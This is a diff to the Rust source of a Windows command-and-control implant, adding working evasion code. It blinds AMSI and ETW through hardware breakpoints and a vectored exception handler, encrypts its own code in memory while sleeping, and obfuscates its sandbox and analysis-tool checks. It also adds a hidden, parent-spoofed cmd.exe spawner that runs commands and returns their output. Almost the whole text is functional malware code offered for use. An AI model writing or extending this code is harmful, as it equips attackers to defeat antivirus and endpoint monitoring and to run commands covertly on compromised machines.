@@ -44,20 +44,67 @@ pub fn should_abort() -> bool {
 /// startup_patches applies all compile-time-selected evasion patches before the
 /// agent contacts the C2. Order matters:
 ///   1. unhook — restores clean ntdll .text so later patches hit unhooked stubs
-///   2. etw-patch — blind ETW before any syscall traffic
-///   3. amsi-patch — disable AMSI before any script execution
-///   4. stack-spoof init — scan ntdll for ret gadget (needs clean ntdll)
-///   5. stomped module loader — remap agent pages into a legitimate DLL (cosmetic)
+///   2. etw-patch / amsi-patch — via HWBP-VEH (preferred, zero bytes written to
+///      ntdll/amsi.dll) or byte-patch fallback
+///   3. stack-spoof init — scan ntdll for ret gadget (needs clean ntdll)
 pub fn startup_patches() {
     // unhook_ntdll is intentionally NOT called here — we use indirect syscalls (Hell's Gate)
     // to bypass user-land EDR hooks without touching ntdll .text, which triggers BD kernel
     // callbacks. The unhook feature still compiles but is invoked separately if needed.
 
-    #[cfg(all(target_os = "windows", feature = "etw-patch"))]
-    patch_etw();
+    #[cfg(target_os = "windows")]
+    {
+        // Resolve both target addresses once so we can arm HWBP for either/both.
+        #[allow(unused_assignments, unused_mut)]
+        let mut amsi_addr: u64 = 0;
+        #[allow(unused_assignments, unused_mut)]
+        let mut etw_addr: u64  = 0;
 
-    #[cfg(all(target_os = "windows", feature = "amsi-patch"))]
-    patch_amsi();
+        #[cfg(feature = "amsi-patch")]
+        {
+            use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
+            unsafe {
+                let s_amsi = crate::obfs::dec(&[0x3B,0x37,0x29,0x33,0x74,0x3E,0x36,0x36,0x5A]);
+                let s_asb  = crate::obfs::dec(&[0x1B,0x37,0x29,0x33,0x09,0x39,0x3B,0x34,0x18,0x2F,0x3C,0x3C,0x3F,0x28,0x5A]);
+                let h = {
+                    let h = GetModuleHandleA(s_amsi.as_ptr());
+                    if h != 0 { h } else { LoadLibraryA(s_amsi.as_ptr()) }
+                };
+                if h != 0 {
+                    if let Some(p) = GetProcAddress(h, s_asb.as_ptr()) {
+                        amsi_addr = p as u64;
+                    }
+                }
+            }
+        }
+
+        #[cfg(feature = "etw-patch")]
+        {
+            use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
+            unsafe {
+                let s_ntdll = crate::obfs::dec(&[0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36,0x5A]);
+                let s_etw   = crate::obfs::dec(&[0x1F,0x2E,0x2D,0x1F,0x2C,0x3F,0x34,0x2E,0x0D,0x28,0x33,0x2E,0x3F,0x5A]);
+                let h = GetModuleHandleA(s_ntdll.as_ptr());
+                if h != 0 {
+                    if let Some(p) = GetProcAddress(h, s_etw.as_ptr()) {
+                        etw_addr = p as u64;
+                    }
+                }
+            }
+        }
+
+        // If we have at least one address, try HWBP-VEH first (no bytes written to DLLs).
+        // Fall back to byte-patch if HWBP setup fails.
+        if amsi_addr != 0 || etw_addr != 0 {
+            let hwbp_ok = hwbp_setup(amsi_addr, etw_addr);
+            if !hwbp_ok {
+                #[cfg(feature = "etw-patch")]
+                patch_etw();
+                #[cfg(feature = "amsi-patch")]
+                patch_amsi();
+            }
+        }
+    }
 
     #[cfg(all(target_arch = "x86_64", feature = "stack-spoof"))]
     crate::syscall::init_stack_spoof();
@@ -70,21 +117,22 @@ pub fn cleanup() {
     self_delete();
 }
 
-/// masked_sleep XOR-encrypts the session key (and optionally the full heap)
-/// for the duration of sleep so memory scanners cannot recover secrets at rest.
+/// masked_sleep XOR-encrypts the session key and, when text bounds are known
+/// from a UDRL staged load, also XOR-encrypts the agent .text section during
+/// sleep so memory scanners see no recognisable code at rest.
 ///
-/// With `heap-encrypt` feature: walks the process heap and XOR-masks every
-/// live allocation. HeapLock/HeapUnlock prevent concurrent allocation during the walk.
-/// Without it: XOR-masks only the 32-byte session key (Phase 2 behaviour).
+/// .text encryption safety: the 2 pages that contain this function itself are
+/// always excluded from the XOR so the encrypt/sleep/decrypt loop never runs
+/// from XOR'd bytes. Sleep is issued via the Win32 Sleep() import (kernel32),
+/// so no agent .text is needed while the thread is blocked.
 ///
-/// Skipped when DM_NO_EVASION=true or DM_SLEEP_ENCRYPT is not "true".
+/// Skipped entirely when DM_NO_EVASION=true or DM_SLEEP_ENCRYPT is not "true".
 pub fn masked_sleep(duration: std::time::Duration, key: &mut [u8; 32]) {
     if NO_EVASION || !SLEEP_ENCRYPT {
         std::thread::sleep(duration);
         return;
     }
 
-    // Derive a one-time XOR mask byte from subsecond entropy; never zero.
     let raw = (std::time::SystemTime::now()
         .duration_since(std::time::UNIX_EPOCH)
         .unwrap_or_default()
@@ -97,12 +145,74 @@ pub fn masked_sleep(duration: std::time::Duration, key: &mut [u8; 32]) {
     #[cfg(all(target_os = "windows", feature = "heap-encrypt"))]
     xor_heap(mask);
 
+    // Step 5: XOR-encrypt .text during sleep if bounds were stored by reflect_pe.
+    #[cfg(all(target_os = "windows", feature = "udrl"))]
+    let text_encrypted = text_xor_sleep(duration, mask);
+    #[cfg(all(target_os = "windows", feature = "udrl"))]
+    if text_encrypted { /* sleep was handled inside text_xor_sleep */ } else { std::thread::sleep(duration); }
+    #[cfg(not(all(target_os = "windows", feature = "udrl")))]
     std::thread::sleep(duration);
 
     #[cfg(all(target_os = "windows", feature = "heap-encrypt"))]
-    xor_heap(mask); // apply same mask again to undo (XOR is its own inverse)
+    xor_heap(mask);
 
     for b in key.iter_mut() { *b ^= mask; }
+}
+
+/// XOR-encrypts .text (excluding the pages containing this function), sleeps,
+/// then decrypts. Returns true if encryption was performed (sleep was handled
+/// internally). Returns false if text bounds are unknown — caller must sleep.
+#[cfg(all(target_os = "windows", feature = "udrl"))]
+#[inline(always)]
+fn text_xor_sleep(duration: std::time::Duration, mask: u8) -> bool {
+    use core::sync::atomic::Ordering;
+    use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READ, PAGE_READWRITE};
+    use windows_sys::Win32::System::Threading::Sleep;
+
+    let base = crate::loader::TEXT_BASE.load(Ordering::Relaxed) as *mut u8;
+    let size = crate::loader::TEXT_SIZE.load(Ordering::Relaxed) as usize;
+    if base.is_null() || size == 0 { return false; }
+
+    // The 2 pages holding this function must never be XOR'd.
+    // We use inline(always) so the code is inlined into masked_sleep's page range.
+    let self_page0 = (masked_sleep as *const u8 as usize) & !0xFFF;
+    let self_page1 = self_page0.wrapping_add(0x1000);
+
+    // Make .text writable.
+    let mut old_prot: u32 = 0;
+    if unsafe { VirtualProtect(base as _, size, PAGE_READWRITE, &mut old_prot) } == 0 {
+        return false;
+    }
+
+    // XOR all pages except the two containing this function.
+    unsafe { xor_text_skip(base, size, mask, self_page0, self_page1) };
+
+    // Sleep via kernel32 import — execution stays in kernel32/ntdll; no .text needed.
+    let ms = duration.as_millis().min(u32::MAX as u128) as u32;
+    unsafe { Sleep(ms) };
+
+    // Decrypt by applying the same mask again (XOR is self-inverse).
+    unsafe { xor_text_skip(base, size, mask, self_page0, self_page1) };
+
+    // Restore execute permission.
+    unsafe { VirtualProtect(base as _, size, PAGE_EXECUTE_READ, &mut old_prot) };
+
+    true
+}
+
+#[cfg(all(target_os = "windows", feature = "udrl"))]
+#[inline(always)]
+unsafe fn xor_text_skip(base: *mut u8, size: usize, mask: u8, skip0: usize, skip1: usize) {
+    let mut off = 0usize;
+    while off < size {
+        let page_addr = base as usize + off;
+        let page_size = 0x1000.min(size - off);
+        if page_addr != skip0 && page_addr != skip1 {
+            let slice = core::slice::from_raw_parts_mut(base.add(off), page_size);
+            for b in slice { *b ^= mask; }
+        }
+        off += page_size;
+    }
 }
 
 // ---------------------------------------------------------------------------
@@ -117,19 +227,31 @@ fn is_debugger_present() -> bool {
 
 #[cfg(target_os = "windows")]
 fn is_sandbox_artifact_present() -> bool {
-    // Check for common sandbox artifacts:
-    // - Known sandbox usernames
-    // - Known sandbox hostnames
-    // - Sandbox driver files
+    use crate::obfs::dec_str;
     let username = std::env::var("USERNAME").unwrap_or_default().to_lowercase();
-    let sandbox_users = ["sandbox", "analyst", "maltest", "test", "virus", "av", "malware"];
-    if sandbox_users.iter().any(|u| username.contains(u)) {
+    // Sandbox-typical usernames — stored XOR'd so they never appear as plaintext
+    let sandbox_users = [
+        dec_str(&[0x29,0x3B,0x34,0x3E,0x38,0x35,0x22]),       // "sandbox"
+        dec_str(&[0x3B,0x34,0x3B,0x36,0x23,0x29,0x2E]),        // "analyst"
+        dec_str(&[0x37,0x3B,0x36,0x2E,0x3F,0x29,0x2E]),        // "maltest"
+        dec_str(&[0x2E,0x3F,0x29,0x2E]),                        // "test"
+        dec_str(&[0x2C,0x33,0x28,0x2F,0x29]),                   // "virus"
+        dec_str(&[0x3B,0x2C]),                                   // "av"
+        dec_str(&[0x37,0x3B,0x36,0x2D,0x3B,0x28,0x3F]),        // "malware"
+    ];
+    if sandbox_users.iter().any(|u| username.contains(u.as_str())) {
         return true;
     }
 
     let hostname = std::env::var("COMPUTERNAME").unwrap_or_default().to_lowercase();
-    let sandbox_hosts = ["sandbox", "analysis", "virus", "malware", "cuckoo"];
-    if sandbox_hosts.iter().any(|h| hostname.contains(h)) {
+    let sandbox_hosts = [
+        dec_str(&[0x29,0x3B,0x34,0x3E,0x38,0x35,0x22]),        // "sandbox"
+        dec_str(&[0x3B,0x34,0x3B,0x36,0x23,0x29,0x33,0x29]),   // "analysis"
+        dec_str(&[0x2C,0x33,0x28,0x2F,0x29]),                   // "virus"
+        dec_str(&[0x37,0x3B,0x36,0x2D,0x3B,0x28,0x3F]),        // "malware"
+        dec_str(&[0x39,0x2F,0x39,0x31,0x35,0x35]),              // "cuckoo"
+    ];
+    if sandbox_hosts.iter().any(|h| hostname.contains(h.as_str())) {
         return true;
     }
 
@@ -180,18 +302,311 @@ fn is_uptime_too_short() -> bool {
 
 #[cfg(target_os = "windows")]
 fn is_analysis_tool_running() -> bool {
-    const TOOLS: &[&str] = &[
-        "wireshark.exe", "procmon.exe", "procmon64.exe",
-        "processhacker.exe", "x64dbg.exe", "x32dbg.exe", "ollydbg.exe",
-        "ida.exe", "ida64.exe", "idag.exe", "idat.exe",
-        "autoruns.exe", "autoruns64.exe",
-        "fiddler.exe", "burpsuite.exe",
-        "dnspy.exe", "dotpeek64.exe",
+    // DJB2 hashes of analysis tool names (all lowercase) — no tool name string
+    // appears in the binary; only the u32 hashes are embedded.
+    const fn djb2(s: &[u8]) -> u32 { crate::obfs::djb2(s) }
+    const TOOL_HASHES: &[u32] = &[
+        djb2(b"wireshark.exe"),
+        djb2(b"procmon.exe"),
+        djb2(b"procmon64.exe"),
+        djb2(b"processhacker.exe"),
+        djb2(b"x64dbg.exe"),
+        djb2(b"x32dbg.exe"),
+        djb2(b"ollydbg.exe"),
+        djb2(b"ida.exe"),
+        djb2(b"ida64.exe"),
+        djb2(b"idag.exe"),
+        djb2(b"idat.exe"),
+        djb2(b"autoruns.exe"),
+        djb2(b"autoruns64.exe"),
+        djb2(b"fiddler.exe"),
+        djb2(b"burpsuite.exe"),
+        djb2(b"dnspy.exe"),
+        djb2(b"dotpeek64.exe"),
     ];
-    enum_process_names().iter().any(|n| TOOLS.contains(&n.as_str()))
+    enum_process_names()
+        .iter()
+        .any(|n| TOOL_HASHES.contains(&djb2(n.as_bytes())))
 }
 
 // ── Phase 3 evasion primitives ────────────────────────────────────────────────
+
+// ---------------------------------------------------------------------------
+// Step 2: PPID-spoofed shell spawner
+// Spawns cmd.exe /C <cmd> with CREATE_NO_WINDOW under an explorer.exe parent
+// so the child process tree doesn't point back to the agent.
+// ---------------------------------------------------------------------------
+
+/// Spawn a shell command with PPID spoofing and return combined stdout+stderr.
+#[cfg(all(target_os = "windows", feature = "ppid-spoof"))]
+pub fn spawn_shell_spoofed(cmd: &str) -> Result<Vec<u8>, &'static str> {
+    use windows_sys::Win32::Foundation::{CloseHandle, FALSE, INVALID_HANDLE_VALUE, HANDLE};
+    use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
+    use windows_sys::Win32::Storage::FileSystem::ReadFile;
+    use windows_sys::Win32::System::Pipes::CreatePipe;
+    use windows_sys::Win32::System::Threading::{
+        CreateProcessW, InitializeProcThreadAttributeList, OpenProcess,
+        UpdateProcThreadAttribute, WaitForSingleObject,
+        EXTENDED_STARTUPINFO_PRESENT, PROCESS_INFORMATION, STARTUPINFOEXW,
+        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, STARTF_USESTDHANDLES,
+        DeleteProcThreadAttributeList,
+    };
+
+    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+    const PROCESS_CREATE_PROCESS: u32 = 0x0080;
+    const INFINITE: u32 = 0xFFFF_FFFF;
+
+    // Prefer explorer.exe as the spoofed parent; fall back to winlogon.exe
+    let parent_pid = find_pid_by_name("explorer.exe")
+        .or_else(|| find_pid_by_name("winlogon.exe"))
+        .ok_or("no suitable ppid spoof parent found")?;
+
+    let parent = unsafe { OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid) };
+    if parent == 0 || parent == INVALID_HANDLE_VALUE {
+        return Err("OpenProcess for ppid spoof failed");
+    }
+
+    // Inheritable SECURITY_ATTRIBUTES for the stdout pipe write end.
+    let sa = SECURITY_ATTRIBUTES {
+        nLength:              core::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
+        lpSecurityDescriptor: core::ptr::null_mut(),
+        bInheritHandle:       1,
+    };
+
+    let (mut rd, mut wr): (HANDLE, HANDLE) = (0, 0);
+    if unsafe { CreatePipe(&mut rd, &mut wr, &sa, 0) } == 0 {
+        unsafe { CloseHandle(parent) };
+        return Err("CreatePipe failed");
+    }
+
+    // Make the read end non-inheritable so the child doesn't hold it open.
+    extern "system" { fn SetHandleInformation(h: HANDLE, mask: u32, flags: u32) -> i32; }
+    unsafe { SetHandleInformation(rd, 1 /*HANDLE_FLAG_INHERIT*/, 0); }
+
+    // Build the proc-thread attribute list for PPID override.
+    let mut attr_size: usize = 0;
+    unsafe { InitializeProcThreadAttributeList(core::ptr::null_mut(), 1, 0, &mut attr_size) };
+    if attr_size == 0 {
+        unsafe { CloseHandle(rd); CloseHandle(wr); CloseHandle(parent) };
+        return Err("InitializeProcThreadAttributeList sizing failed");
+    }
+    let mut attr_buf = vec![0u8; attr_size];
+    let attr_list = attr_buf.as_mut_ptr() as *mut _;
+    if unsafe { InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size) } == 0 {
+        unsafe { CloseHandle(rd); CloseHandle(wr); CloseHandle(parent) };
+        return Err("InitializeProcThreadAttributeList init failed");
+    }
+    let mut parent_val: HANDLE = parent;
+    if unsafe {
+        UpdateProcThreadAttribute(
+            attr_list, 0,
+            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
+            &mut parent_val as *mut HANDLE as *mut _,
+            core::mem::size_of::<HANDLE>(),
+            core::ptr::null_mut(), core::ptr::null_mut(),
+        )
+    } == 0 {
+        unsafe { DeleteProcThreadAttributeList(attr_list); CloseHandle(rd); CloseHandle(wr); CloseHandle(parent) };
+        return Err("UpdateProcThreadAttribute failed");
+    }
+
+    // Redirect stdout + stderr to the write end of our pipe.
+    let mut si: STARTUPINFOEXW = unsafe { core::mem::zeroed() };
+    si.StartupInfo.cb        = core::mem::size_of::<STARTUPINFOEXW>() as u32;
+    si.StartupInfo.dwFlags   = STARTF_USESTDHANDLES;
+    si.StartupInfo.hStdInput  = INVALID_HANDLE_VALUE;
+    si.StartupInfo.hStdOutput = wr;
+    si.StartupInfo.hStdError  = wr;
+    si.lpAttributeList        = attr_list;
+
+    let cmdline = format!("cmd.exe /C {cmd}");
+    let mut cmdline_w: Vec<u16> = cmdline.encode_utf16().chain(core::iter::once(0)).collect();
+
+    let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };
+    let ok = unsafe {
+        CreateProcessW(
+            core::ptr::null(),
+            cmdline_w.as_mut_ptr(),
+            core::ptr::null_mut(), core::ptr::null_mut(),
+            1, // bInheritHandles = TRUE so write pipe is passed to child
+            CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
+            core::ptr::null_mut(), core::ptr::null_mut(),
+            &mut si.StartupInfo,
+            &mut pi,
+        )
+    };
+
+    unsafe {
+        DeleteProcThreadAttributeList(attr_list);
+        CloseHandle(wr); // child holds it; close our copy so ReadFile gets EOF
+        CloseHandle(parent);
+    }
+
+    if ok == 0 {
+        unsafe { CloseHandle(rd) };
+        return Err("CreateProcessW (spoofed) failed");
+    }
+
+    // Drain the pipe until the child exits.
+    let mut out = Vec::new();
+    let mut buf = [0u8; 4096];
+    loop {
+        let mut n: u32 = 0;
+        if unsafe { ReadFile(rd, buf.as_mut_ptr(), buf.len() as u32, &mut n, core::ptr::null_mut()) } == 0
+            || n == 0 { break; }
+        out.extend_from_slice(&buf[..n as usize]);
+    }
+    unsafe {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        CloseHandle(rd);
+    }
+    Ok(out)
+}
+
+/// Find the first PID whose exe name (case-insensitive) matches `name`.
+#[cfg(all(target_os = "windows", feature = "ppid-spoof"))]
+fn find_pid_by_name(name: &str) -> Option<u32> {
+    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
+    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
+        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
+        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
+    };
+    let lower = name.to_ascii_lowercase();
+    unsafe {
+        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if snap == INVALID_HANDLE_VALUE { return None; }
+        let mut e: PROCESSENTRY32W = core::mem::zeroed();
+        e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
+        if Process32FirstW(snap, &mut e) != 0 {
+            loop {
+                let nlen = e.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
+                let n = String::from_utf16_lossy(&e.szExeFile[..nlen]).to_ascii_lowercase();
+                if n == lower { CloseHandle(snap); return Some(e.th32ProcessID); }
+                e = core::mem::zeroed();
+                e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
+                if Process32NextW(snap, &mut e) == 0 { break; }
+            }
+        }
+        CloseHandle(snap);
+    }
+    None
+}
+
+// ---------------------------------------------------------------------------
+// Step 4: Hardware-breakpoint VEH for AMSI / ETW
+// Sets DR0 = AmsiScanBuffer, DR1 = EtwEventWrite via NtSetContextThread,
+// then intercepts EXCEPTION_SINGLE_STEP in a VEH to redirect execution
+// without writing any bytes to ntdll/amsi.dll.
+// ---------------------------------------------------------------------------
+
+#[cfg(target_os = "windows")]
+static HWBP_DR0: core::sync::atomic::AtomicU64 = core::sync::atomic::AtomicU64::new(0);
+#[cfg(target_os = "windows")]
+static HWBP_DR1: core::sync::atomic::AtomicU64 = core::sync::atomic::AtomicU64::new(0);
+
+/// Register the HWBP VEH and arm DR0 (AMSI) + DR1 (ETW) on the current thread.
+/// Returns true if setup succeeded; callers should fall back to byte-patching on false.
+#[cfg(target_os = "windows")]
+pub fn hwbp_setup(amsi_addr: u64, etw_addr: u64) -> bool {
+    use windows_sys::Win32::System::Diagnostics::Debug::{
+        AddVectoredExceptionHandler, CONTEXT,
+    };
+    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
+
+    // ContextFlags value for debug registers on AMD64
+    const CONTEXT_DEBUG_REGISTERS: u32 = 0x0010_0010;
+
+    HWBP_DR0.store(amsi_addr, core::sync::atomic::Ordering::Relaxed);
+    HWBP_DR1.store(etw_addr,  core::sync::atomic::Ordering::Relaxed);
+
+    // Register VEH (first in chain = highest priority)
+    let handler = unsafe { AddVectoredExceptionHandler(1, Some(veh_hwbp)) };
+    if handler.is_null() { return false; }
+
+    // Set DR0/DR1 on the current thread via NtSetContextThread(-2 = current thread).
+    // GetThreadContext/SetThreadContext reject the current-thread pseudo-handle;
+    // NtSetContextThread accepts it.
+    unsafe {
+        let ntdll = GetModuleHandleA(crate::obfs::dec(
+            &[0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36,0x5A]).as_ptr());
+        if ntdll == 0 { return false; }
+
+        type NtGetCtx = unsafe extern "system" fn(isize, *mut CONTEXT) -> i32;
+        type NtSetCtx = unsafe extern "system" fn(isize, *const CONTEXT) -> i32;
+
+        let get_fn = match GetProcAddress(ntdll, b"NtGetContextThread\0".as_ptr()) {
+            Some(f) => core::mem::transmute::<_, NtGetCtx>(f),
+            None    => return false,
+        };
+        let set_fn = match GetProcAddress(ntdll, b"NtSetContextThread\0".as_ptr()) {
+            Some(f) => core::mem::transmute::<_, NtSetCtx>(f),
+            None    => return false,
+        };
+
+        const NT_CURRENT_THREAD: isize = -2;
+        let mut ctx: CONTEXT = core::mem::zeroed();
+        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+        if get_fn(NT_CURRENT_THREAD, &mut ctx) < 0 { return false; }
+
+        ctx.Dr0 = amsi_addr;
+        ctx.Dr1 = etw_addr;
+        // DR7: L0 (bit 0) enables DR0, L1 (bit 2) enables DR1; both execute-break (type=00, len=00)
+        ctx.Dr7 = (ctx.Dr7 & !0xFF) | 0x0005;
+
+        set_fn(NT_CURRENT_THREAD, &ctx) >= 0
+    }
+}
+
+/// VEH handler installed by hwbp_setup.
+/// On DR0 (AmsiScanBuffer): set result = AMSI_RESULT_CLEAN, return S_OK.
+/// On DR1 (EtwEventWrite): silent return (no event written).
+#[cfg(target_os = "windows")]
+unsafe extern "system" fn veh_hwbp(
+    info: *mut windows_sys::Win32::System::Diagnostics::Debug::EXCEPTION_POINTERS,
+) -> i32 {
+    const EXCEPTION_SINGLE_STEP:       i32 = 0x8000_0004u32 as i32;
+    const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
+    const EXCEPTION_CONTINUE_SEARCH:    i32 = 0;
+
+    let rec = &*(*info).ExceptionRecord;
+    if rec.ExceptionCode != EXCEPTION_SINGLE_STEP {
+        return EXCEPTION_CONTINUE_SEARCH;
+    }
+
+    let ctx = &mut *(*info).ContextRecord;
+    let dr6 = ctx.Dr6;
+    ctx.Dr6 = 0; // clear status so the next breakpoint fires cleanly
+
+    let rsp = ctx.Rsp as *const u64;
+
+    if dr6 & 0x1 != 0 {
+        // DR0 = AmsiScanBuffer
+        // Prototype: HRESULT AmsiScanBuffer(ctx, buf, len, name, session, *result)
+        // x64: args 1-4 in rcx/rdx/r8/r9; arg5=[rsp+0x28]; arg6=[rsp+0x30]
+        let result_ptr = *rsp.add(6) as *mut u32;
+        if !result_ptr.is_null() {
+            *result_ptr = 0; // AMSI_RESULT_CLEAN
+        }
+        ctx.Rax = 0; // S_OK
+        ctx.Rip = *rsp; // return to caller
+        ctx.Rsp += 8;
+        ctx.EFlags |= 0x0001_0000; // RF flag: suppress re-trigger on same RIP
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+
+    if dr6 & 0x2 != 0 {
+        // DR1 = EtwEventWrite — silent return, event never written
+        ctx.Rax = 0;
+        ctx.Rip = *rsp;
+        ctx.Rsp += 8;
+        ctx.EFlags |= 0x0001_0000;
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+
+    EXCEPTION_CONTINUE_SEARCH
+}
 
 /// Patch EtwEventWrite in the in-memory ntdll with a `ret` stub so ETW-based
 /// detections are blinded. The patch is applied in-process only.
